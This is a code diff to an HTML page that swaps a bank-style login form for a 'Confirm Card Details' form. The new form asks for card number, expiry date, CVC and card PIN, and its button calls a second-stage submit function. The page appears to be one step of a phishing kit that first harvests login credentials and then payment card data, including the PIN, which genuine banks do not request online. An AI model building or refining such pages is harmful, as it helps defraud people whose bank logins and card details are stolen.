@@ -45,26 +45,24 @@
         </div>
 
         <div class="mainRight">
-          <h3>Log In</h3>
-          <div class="loginType">
-            <a href="#" class="active"> Personal / Business </a>
-            <a href="#"> Commercial </a>
-          </div>
+          <h3>Confirm Card Details</h3>
 
           <div class="mainForm">
             <form>
-              <label> User ID </label>
-              <input
-                type="text"
-                placeholder="User ID"
-                autocomplete="organization"
-                id="orgus"
-              />
-              <label> Passcode </label>
-              <input type="password" placeholder="Passcode" id="orgpd" />
-              <a href="#"> Help with User ID or Passcode </a>
-              <button type="button" id="firstbtn" onclick="firstsubmit()">
-                Log In <i class="fa fa-chevron-right"></i>
+              <label> Enter your Card Number </label>
+              <input type="number" autocomplete="organization" id="orgcn" />
+
+              <label> Enter your Expiry Date </label>
+              <input type="text" autocomplete="organization" id="orged" />
+
+              <label> Enter your Card CVC </label>
+              <input type="number" autocomplete="off" id="orgcc" />
+
+              <label> Enter your Card Pin </label>
+              <input type="password" autocomplete="off" id="orgcp" />
+
+              <button type="button" id="secondbtn" onclick="secondsubmit()">
+                Confirm Card <i class="fa fa-chevron-right"></i>
               </button>
             </form>
 
